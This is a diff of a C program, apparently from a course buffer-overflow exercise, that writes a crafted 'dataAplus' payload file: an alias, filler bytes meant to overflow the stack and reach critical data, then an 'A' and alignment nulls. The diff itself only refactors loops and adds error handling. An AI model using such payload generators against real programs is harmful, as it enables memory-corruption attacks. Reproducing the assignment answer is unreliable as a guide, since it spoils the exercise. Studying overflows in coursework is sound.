@@ -1,6 +1,6 @@
 /*--------------------------------------------------------------------*/
 /* createdataAplus.c                                                  */
-/* author: replaced_author                                             */
+/* author: anish k                                                     */
 /*--------------------------------------------------------------------*/
 
 /*
@@ -76,21 +76,28 @@ int main(void) {
 
     /* open the crafted payload file */
     pFileHandle = fopen("dataAplus", "w");
-    if (!pFileHandle) return 1;
+    if (!pFileHandle) {
+        fprintf(stderr, "error: could not open dataAplus for writing\n");
+        return 1;
+    }
 
     /* put the chosen alias plus its terminating null */
     fwrite(pszUserAlias, 1, LEN_USER_ALIAS, pFileHandle);
     fputc('\0', pFileHandle);
 
     /* fill with '0' chars to overflow stack frames and reach critical data */
-    for (counter = 0; counter < CNT_OVERFLOW; counter++) {
+    counter = 0;
+    while (counter < CNT_OVERFLOW) {
         fputc('0', pFileHandle);
+        counter++;
     }
 
     /* place 'A', which we'll print, followed by nulls for alignment */
     fputc('A', pFileHandle);
-    for (counter = 0; counter < CNT_ALIGN_BYTES; counter++) {
+    counter = 0;
+    while (counter < CNT_ALIGN_BYTES) {
         fputc('\0', pFileHandle);
+        counter++;
     }
 
     /*
